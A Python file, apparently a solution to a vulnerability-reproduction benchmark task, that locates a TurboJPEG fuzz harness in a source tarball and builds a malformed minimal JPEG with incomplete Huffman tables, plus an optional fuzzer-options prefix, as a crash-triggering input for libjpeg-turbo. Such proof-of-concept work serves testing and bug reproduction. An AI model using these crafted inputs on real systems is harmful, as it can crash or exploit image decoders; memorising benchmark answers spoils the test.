import os
import re
import tarfile
from typing import Optional, Tuple


def _be16(n: int) -> bytes:
    return bytes([(n >> 8) & 0xFF, n & 0xFF])


def _marker(m: int) -> bytes:
    return bytes([0xFF, m & 0xFF])


def _segment(marker: int, payload: bytes) -> bytes:
    return _marker(marker) + _be16(len(payload) + 2) + payload


def _build_minimal_jpeg_baseline_ycbcr_420(width: int, height: int) -> bytes:
    # SOI
    out = bytearray()
    out += _marker(0xD8)

    # APP0 JFIF
    app0 = b"JFIF\x00" + bytes([0x01, 0x01]) + bytes([0x00]) + _be16(1) + _be16(1) + bytes([0x00, 0x00])
    out += _segment(0xE0, app0)

    # DQT: table 0, all ones in zigzag order
    dqt = bytes([0x00]) + bytes([1] * 64)
    out += _segment(0xDB, dqt)

    # SOF0: 8-bit, 3 components, 4:2:0 (Y 2x2, Cb 1x1, Cr 1x1)
    sof0 = bytearray()
    sof0 += bytes([8]) + _be16(height) + _be16(width) + bytes([3])
    sof0 += bytes([1, 0x22, 0])  # Y
    sof0 += bytes([2, 0x11, 0])  # Cb
    sof0 += bytes([3, 0x11, 0])  # Cr
    out += _segment(0xC0, bytes(sof0))

    # DHT: minimal incomplete tables
    # DC table 0: one code of length 1 -> symbol 0
    # AC table 0: one code of length 1 -> symbol 0x00 (EOB)
    bits = bytes([1] + [0] * 15)
    dht = bytearray()
    dht += bytes([0x00]) + bits + bytes([0x00])
    dht += bytes([0x10]) + bits + bytes([0x00])
    out += _segment(0xC4, bytes(dht))

    # SOS
    sos = bytearray()
    sos += bytes([3])
    sos += bytes([1, 0x00])
    sos += bytes([2, 0x00])
    sos += bytes([3, 0x00])
    sos += bytes([0x00, 0x3F, 0x00])
    out += _segment(0xDA, bytes(sos))

    # Entropy-coded scan data: for each block, emit DC=0 (code '0') then AC EOB (code '0') => "00"
    h_samps = [2, 1, 1]
    v_samps = [2, 1, 1]
    hmax = max(h_samps)
    vmax = max(v_samps)
    mcu_w = 8 * hmax
    mcu_h = 8 * vmax
    mcus_x = (width + mcu_w - 1) // mcu_w
    mcus_y = (height + mcu_h - 1) // mcu_h
    blocks_per_mcu = sum(h_samps[i] * v_samps[i] for i in range(3))
    total_blocks = mcus_x * mcus_y * blocks_per_mcu

    total_bits = total_blocks * 2
    total_bytes = (total_bits + 7) // 8
    scan = bytearray(b"\x00" * total_bytes)
    rem = total_bits & 7
    if rem:
        pad = 8 - rem
        scan[-1] = (1 << pad) - 1  # pad with 1 bits in the LSBs
    out += scan

    # EOI
    out += _marker(0xD9)
    return bytes(out)


def _select_fuzzer_source_from_tar(src_path: str) -> Tuple[Optional[str], Optional[str]]:
    try:
        with tarfile.open(src_path, "r:*") as tf:
            best_name = None
            best_content = None
            best_score = -1
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                lower = name.lower()
                if not (lower.endswith(".c") or lower.endswith(".cc") or lower.endswith(".cpp") or lower.endswith(".cxx")):
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                try:
                    s = data.decode("utf-8", errors="ignore")
                except Exception:
                    continue
                if "LLVMFuzzerTestOneInput" not in s:
                    continue

                score = 0
                score += 10
                score += 2 * s.count("tj3")
                score += 3 * (("tj3Compress" in s) or ("Compress" in s) or ("compress" in s))
                score += 3 * (("tj3Transform" in s) or ("Transform" in s) or ("transform" in s))
                score += 2 * (("tj3Decompress" in s) or ("Decompress" in s) or ("decompress" in s))
                score += 2 * ("FuzzedDataProvider" in s)

                if score > best_score:
                    best_score = score
                    best_name = name
                    best_content = s
            return best_name, best_content
    except Exception:
        return None, None


def _needs_prefix_for_fuzzer(content: Optional[str]) -> bool:
    if not content:
        return False
    if "FuzzedDataProvider" not in content:
        return False
    # If the fuzzer pulls a byte buffer from the provider, it likely expects options first.
    if "ConsumeRemainingBytes" in content or "ConsumeRemainingBytesAsString" in content:
        return True
    # Heuristic for pulling a vector/bytes as "jpeg" or "src" from fdp
    if re.search(r"fdp\.\s*Consume(Bytes|RandomLengthString|RandomLengthByteString)", content):
        if re.search(r"(jpeg|jpg|jpegbuf|srcbuf|inputbuf|jpegBuf|srcBuf)", content, re.IGNORECASE):
            return True
    # Default: provider present => likely options-first
    return True


class Solution:
    def solve(self, src_path: str) -> bytes:
        _, content = _select_fuzzer_source_from_tar(src_path)
        prefix_needed = _needs_prefix_for_fuzzer(content)

        jpeg = _build_minimal_jpeg_baseline_ycbcr_420(257, 257)

        if not prefix_needed:
            return jpeg

        # Safe, small-valued options prefix for FuzzedDataProvider (little-endian 1s)
        prefix = (b"\x01\x00\x00\x00" * 64)
        # Extra tail bytes are generally ignored by JPEG decoders and can provide additional fuzz data if needed.
        tail = b"\x00" * 32
        return prefix + jpeg + tail